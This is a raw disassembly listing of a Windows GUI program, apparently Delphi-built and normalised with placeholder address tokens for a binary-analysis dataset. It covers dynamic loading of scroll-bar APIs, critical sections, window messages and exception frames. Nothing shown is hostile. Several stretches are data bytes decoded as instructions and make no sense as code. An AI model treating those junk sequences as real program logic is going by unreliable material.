mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f94
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42a398
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a6a8
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
call sub_429eac
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_429edc
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42a07c
sub_42a6cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_428df4
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_428df4
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_417d84
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_428df4
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_417d84
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_417d84
sub_42a758
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_429e6c
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_40316c
mov eax [ esi + 0x14 ]
call sub_40316c
mov eax [ esi + 0x10 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4058d0
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42a7ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a7e3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a7ea
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42a7f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a819
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a820
retn
sub_42a82c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a85d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a864
retn
mov eax [ rw-data ]
call sub_40316c
sub_42a870
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42a8a4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42a8cc
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42ab4e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ab75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ab7c
retn
sub_42ab90
fsubr [ ebx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xab
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ esp + ebp * 4 + 0x42 ] bl
add [ eax - 0x54 ] ah
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x40 ] si
lodsb [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x54 ] cl
inc edx
add [ eax + eax ] bl
add [ eax ] al
nop
stosd [ edi ]
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp + ebp * 4 - 0x532bffbe ] ah
inc edx
add al ah
lodsb [ esi ]
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42ac64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42aca4
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42acfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ad21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad28
retn
sub_42ad34
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42acec
xor eax eax
push ebp
push sub_42aeeb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aef2
mov eax [ rw-data ]
call sub_42acf4
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42aef4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42acec
xor eax eax
push ebp
push sub_42b2a7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b2ae
mov eax [ rw-data ]
call sub_42acf4
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42b658
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42b680
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b6c8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6cf
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_40316c
call sub_42ad34
cmp [ rw-data ] 0x0
jg r-xdata
sub_42b6f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b715
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b71c
retn
sub_42b728
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b74d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b754
retn
sub_42b760
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b785
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b78c
retn
sub_42b798
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b7bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7c4
retn
sub_42b7d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b7f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7fc
retn
sub_42b808
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b82d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b834
retn
sub_42b840
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b865
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b86c
retn
sub_42b878
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b89d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8a4
retn
sub_42b8b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b8d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8dc
retn
sub_42b8e8
xor al 0xb9
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42b9 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 4 + 0x42 ] dh
add [ ecx + edi * 4 + r--data ] dl
add [ eax ] al
pushad
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
clc
mov edx 0x31040042
inc eax
add [ eax ] ah
xor [ eax ] eax
pushfd
mov edx 0x858c0042
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
pushfd
mov ebx 0xbbb40042
inc edx
add [ esp + edi * 4 - 0x434fffbe ] bl
inc edx
add [ 0x6d6f4354 ] cl
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
test al 0xb9
inc edx
add [ edi ] al
or eax 0x6d6f4354
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xb934676f
inc edx
add [ eax + ebp * 2 + 0x41 ] bl
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
push eax
push edx
inc ecx
add [ eax ] bh
add [ eax ] al
sub_42b9f3
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsb
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e6d8
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_403490
push sub_42bb30
call sub_41f768
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
mov esp 0x48004152
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
push ebx
push 0x5653776f
test dl dl
je r-xdata
mov esp 0x50004152
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0600
sub_42ba9c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
test bl bl
jle r-xdata
call sub_41f800
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42bad0
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4608ac
mov cl 0x1
sub_42baf8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4033bc
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42bb30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bb5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42bbc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_4571ac
mov [ ebp - 0x14 ] eax
call sub_4570c8
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42bc8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46019c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42bc5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc64
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4601f8
retn
sub_42bc64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc92
mov eax [ ebp - 0x14 ]
call sub_457260
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_4570d0
retn
sub_42bd68
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_409098
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42be03
add [ edi ] cl
add [ eax ] al
add [ eax + edi * 2 + 0x48 ] dl
add [ eax + 0x4885 ] dl
add [ eax ] al
add [ eax + 0x78 ] dl
dec eax
add [ ecx + ecx * 4 ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x48 ] cl
add [ ebp + eax * 4 + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] cl
dec eax
add [ eax + 0x488a ] al
add [ eax ] al
add [ eax + edi * 2 + 0x48 ] al
add [ ecx + ecx * 4 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] al
dec eax
add [ eax + ecx * 4 + 0x48 ] al
add [ eax ] al
cmp al 0x78
dec eax
add ah bh
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x48 ] bh
add [ edi + eax * 4 + 0x48 ] cl
add [ eax ] al
xor al 0x78
dec eax
add [ eax + 0x4888 ] bh
add [ eax ] al
add [ eax ] dh
js r-xdata
xor eax eax
push ebp
push sub_42bf0e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax + 0x4887 ] bh
add [ eax ] al
add [ eax + edi * 2 ] ch
dec eax
add [ eax - 0x75 ] al
dec eax
add [ eax ] al
add [ eax ] al
add al bh
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf15
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp eax rw-data
add [ esp + ecx + 0x66 ] dh
mov eax [ rw-data ]
add al bh
test [ eax ] ecx
add [ eax ] al
add [ eax ] al
hlt
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_4049c8
push eax
call GlobalDeleteAtom
mov ax [ rw-data ]
sub_42bf18
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c90
call sub_42bd68
mov eax [ r-xdata ]
call sub_4176d0
mov eax [ r-xdata ]
call sub_417770
mov edx [ r-xdata ]
mov eax [ sub_42b8e8 ]
call sub_41771c
sub_42bf59
mov edi 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_43022c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
mov edi 0xbfdc0042
inc edx
add [ eax + eax ] al
add [ eax + 0x67 ] ah
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
into
inc edx
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
pop esp
push 0x50041
or [ ebp + 0x78 ] al
je r-xdata
dec ecx
outsb
je r-xdata
jae r-xdata
jb r-xdata
inc edx
popad
insb
jae r-xdata
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x6974704f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + eax * 8 + 0x42 ] ch
add [ edx ] cl
bound esi [ eax + 0x6f ]
inc edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42c07072
add [ ebx ] al
adc [ edx + eax * 2 + 0x61 ] dl
rol [ edx ] 0x6
adc [ edx + eax * 2 + 0x61 ] edx
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x6974704f
je r-xdata
popad
insb
mov esp 0x38004152
add [ eax ] al
push [ eax - 0x31 ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
bound esp [ edx + 0x65 ]
jb r-xdata
inc eax
add [ eax ] al
add bh bh
push eax
iretd
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
call [ eax - 0x31 ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
rol [ edx ] 0xcc
rol [ edx ] 0x8
push cs
push esp
inc edx
popad
outsb
inc esp
jb r-xdata
insb
outsw
inc ebp
jbe r-xdata
outsd
outsb
